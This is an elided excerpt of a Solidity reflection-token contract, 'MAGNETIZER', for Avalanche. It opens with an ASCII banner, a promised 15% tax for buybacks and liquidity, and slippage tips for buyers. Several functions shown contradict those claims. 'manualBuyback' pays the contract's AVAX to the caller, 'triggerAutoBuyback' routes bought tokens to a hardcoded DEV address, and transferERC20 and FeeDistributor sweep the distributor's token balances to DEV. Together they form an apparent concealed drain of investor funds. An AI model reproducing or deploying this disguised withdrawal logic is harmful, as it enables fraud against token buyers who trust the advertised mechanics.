...
15% tax for buybacks and liquidity pool


$$\      $$\  $$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$$\$$$$$$$$\$$$$$$\$$$$$$$$\ $$$$$$$$\ $$$$$$$\  
$$$\    $$$ |$$  __$$\ $$  __$$\ $$$\  $$ |$$  _____\__$$  __\_$$  _\____$$  |$$  _____|$$  __$$\ 
$$$$\  $$$$ |$$ /  $$ |$$ /  \__|$$$$\ $$ |$$ |        $$ |    $$ |     $$  / $$ |      $$ |  $$ |
$$\$$\$$ $$ |$$$$$$$$ |$$ |$$$$\ $$ $$\$$ |$$$$$\      $$ |    $$ |    $$  /  $$$$$\    $$$$$$$  |
$$ \$$$  $$ |$$  __$$ |$$ |\_$$ |$$ \$$$$ |$$  __|     $$ |    $$ |   $$  /   $$  __|   $$  __$$< 
$$ |\$  /$$ |$$ |  $$ |$$ |  $$ |$$ |\$$$ |$$ |        $$ |    $$ |  $$  /    $$ |      $$ |  $$ |
$$ | \_/ $$ |$$ |  $$ |\$$$$$$  |$$ | \$$ |$$$$$$$$\   $$ |  $$$$$$\$$$$$$$$\ $$$$$$$$\ $$ |  $$ |
\__|     \__|\__|  \__| \______/ \__|  \__|\________|  \__|  \______\________|\________|\__|  \__|
                                                                                                  
Use 16-20%+ Slippage to process transactions. 

If you have any issues, please change any zeros in the amount you are swapping to 1s, as this helps with rounding issues on DEXs. 
i.e Buying/Selling 261,111,111,111 instead of 260,000,000,000.
...
contract DividendDistributor is IDividendDistributor {
    ...
    IERC20 EP = IERC20(0x1d60109178C48E4A937D8AB71699D8eBb6F7c5dE); // MAGNET
    address WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEV = 0x4161820aBd8fC9297dDb6FB2582303948Eba6Bb0;
    IJoeRouter02 router;
    ...
    uint256 public minPeriod = 1 hours; //1 hours;
    ...
    function transferAVAX(uint256 weiAmount) public {
    ...
    function transferERC20(address tokenAddress) public {
        require(msg.sender == DEV || msg.sender == _token);
        IERC20(tokenAddress).transfer(DEV, IERC20(tokenAddress).balanceOf(address(this)));
    }
    ...
    function setReflectionToken(address _epreflecttk) public {
        require(msg.sender == DEV);
        EP = IERC20(_epreflecttk);
    }
...
contract MAGNETIZER is IERC20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0x1d60109178C48E4A937D8AB71699D8eBb6F7c5dE; // MAGNET
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7; // WAVAX
    address DEV = 0x4161820aBd8fC9297dDb6FB2582303948Eba6Bb0;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "MAGNETIZER";
    string constant _symbol = "MAG2";
    ...
    uint256 liquidityFee = 300; //3% goes to liquidity to the pair
    uint256 buybackFee = 0;
    uint256 reflectionFee = 300;
    uint256 treasuryFee = 900;
    uint256 totalFee = 1500;
    uint256 feeDenominator = 10000;

    address public autoLiquidityReceiver=0xB0f2eB83c91fEb3862B869f0527329FD52dD3883;  //liq address
    address public treasuryFeeReceiver=0xB0f2eB83c91fEb3862B869f0527329FD52dD3883; // treasury address
   ...
   // Approve the router with totalSupply; 
    ...
    function triggerAutoBuyback() internal {
        buyTokens(autoBuybackAmount, DEV);
    ...
    function FeeDistributor(address tokenAddress) public onlyOwner {
        distributor.transferERC20(tokenAddress);
    }

    function manualBuyback(uint256 weiAmount) external authorized {
        require(address(this).balance >= weiAmount, "insufficient AVAX balance");
        payable(msg.sender).transfer(weiAmount);
    }

    function transferERC20(address tokenAddress) public onlyOwner {
    ...
    function setReflectionToken(address _epreflect) external authorized {
        EP = _epreflect;
    }
    ...
    event AutoLiquify(uint256 amountAVAX, uint256 amountMLOCK);
